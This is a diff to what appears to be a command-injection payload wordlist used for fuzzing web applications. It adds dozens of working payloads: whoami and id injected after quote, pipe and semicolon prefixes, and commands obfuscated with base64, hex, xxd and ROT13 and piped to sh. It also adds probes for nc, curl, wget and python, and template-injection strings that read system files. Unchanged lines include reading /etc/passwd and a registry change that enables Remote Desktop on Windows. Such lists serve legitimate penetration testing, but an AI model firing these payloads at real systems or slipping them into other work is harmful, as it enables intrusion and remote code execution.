@@ -82,6 +82,7 @@ a|id
 '.print((`id`)).'`
 `&**='.print((`id`)).'`
 |/bin/ls -al
+/bin/ls -al
 a);/usr/bin/id
 a;/usr/bin/id
 a);/usr/bin/id;
@@ -186,6 +187,59 @@ echo $'\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64' | sh
 <!--#exec cmd="/usr/bin/id;-->
 system('cat /etc/passwd');
 <?php system("cat /etc/passwd");?>
+which curl
+/bin/which curl
+which gcc
+/bin/which gcc
+which nc
+/bin/which nc
+which netcat
+/bin/which netcat
+which perl
+/bin/which perl
+which python
+/bin/which python
+/bin/which python3
+which wget
+/bin/which wget
+whoami
+/bin/whoami
+echo L2Jpbi93aG9hbWk= | base64 --decode | sh
+`echo L2Jpbi93aG9hbWk= | base64 --decode`
+echo 2f62696e2f77686f616d69 | xxd -r -p | sh
+echo 2f62696e2f77686f616d69 | /bin/xxd -r -p | sh
+`echo 2f62696e2f77686f616d69 | xxd -r -p`
+`echo 2f62696e2f77686f616d69 | /bin/xxd -r -p`
+echo /ova/jubnzv | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh
+`echo /ova/jubnzv | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
+echo $'\x2f\x62\x69\x6e\x2f\x77\x68\x6f\x61\x6d\x69' | sh
+`echo $'\x2f\x62\x69\x6e\x2f\x77\x68\x6f\x61\x6d\x69'`
+| whoami
+; whoami
+' whoami
+' || whoami
+' & whoami
+' && whoami
+'; whoami
+" whoami
+" || whoami
+" | whoami
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
+{{ get_user_file("C:\boot.ini") }}
+{{ get_user_file("/etc/hosts") }}
+{{4+4}}
+{{4+8}}
+{{person.secret}}
+{{person.name}}
+{1} + {1}
+{% For c in [1,2,3]%} {{c, c, c}} {% endfor%}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
+
 ```
 
 ### Windows :
@@ -398,6 +452,7 @@ net view
 \nid\n
 \n/usr/bin/id\n
 perl -e 'print "X"x1024'
+/bin/perl -e 'print "X"x1024'
 || perl -e 'print "X"x16096'
 | perl -e 'print "X"x16096'
 ; perl -e 'print "X"x16096'
@@ -446,10 +501,15 @@ phpinfo();
 ${@print("RCEVulnerable")}
 ${@print(system($_SERVER['HTTP_USER_AGENT']))}
 pwd
+/bin/pwd
 | pwd
+| /bin/pwd
 ; pwd
+; /bin/pwd
 & pwd
+& /bin/pwd
 && pwd
+&& /bin/pwd
 \r
 | reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ; reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
@@ -458,18 +518,31 @@ pwd
 reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 \r\n
 route
-| sleep 1
-; sleep 1
+/bin/sleep 5
+| sleep 5
+| /bin/sleep 5
+; sleep 5
+; /bin/sleep 5
 & sleep 1
-&& sleep 1
-sleep 1
+/bin/sleep 5
+&& sleep 5
+/bin/sleep 5
+sleep 5 
+/bin/sleep 5
 || sleep 10
+/bin/sleep 10
 | sleep 10
+/bin/sleep 10
 ; sleep 10
+/bin/sleep 10
 {${sleep(10)}}
-& sleep 10 
+{${/bin/sleep(10)}}
+& sleep 10
+& /bin/sleep 10
 && sleep 10
+&& /bin/sleep 10
 sleep 10
+/bin/sleep 10
 || sleep 15
 | sleep 15
 ; sleep 15
@@ -576,13 +649,32 @@ $(`wget https://crowdshield.com/.testing/rce_vuln.txt`)
 wget https://crowdshield.com/.testing/rce_vuln.txt
 $(`wget https://crowdshield.com/.testing/rce_vuln.txt?req=22jjffjbn`)
 which curl
+/bin/which curl
 which gcc
+/bin/which gcc
 which nc
+/bin/which nc
 which netcat
+/bin/which netcat
 which perl
+/bin/which perl
 which python
+/bin/which python
+/bin/which python3
 which wget
+/bin/which wget
 whoami
+/bin/whoami
+echo L2Jpbi93aG9hbWk= | base64 --decode | sh
+`echo L2Jpbi93aG9hbWk= | base64 --decode`
+echo 2f62696e2f77686f616d69 | xxd -r -p | sh
+echo 2f62696e2f77686f616d69 | /bin/xxd -r -p | sh
+`echo 2f62696e2f77686f616d69 | xxd -r -p`
+`echo 2f62696e2f77686f616d69 | /bin/xxd -r -p`
+echo /ova/jubnzv | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh
+`echo /ova/jubnzv | tr 'A-Za-z' 'N-ZA-Mn-za-m'`
+echo $'\x2f\x62\x69\x6e\x2f\x77\x68\x6f\x61\x6d\x69' | sh
+`echo $'\x2f\x62\x69\x6e\x2f\x77\x68\x6f\x61\x6d\x69'`
 | whoami
 ; whoami
 ' whoami
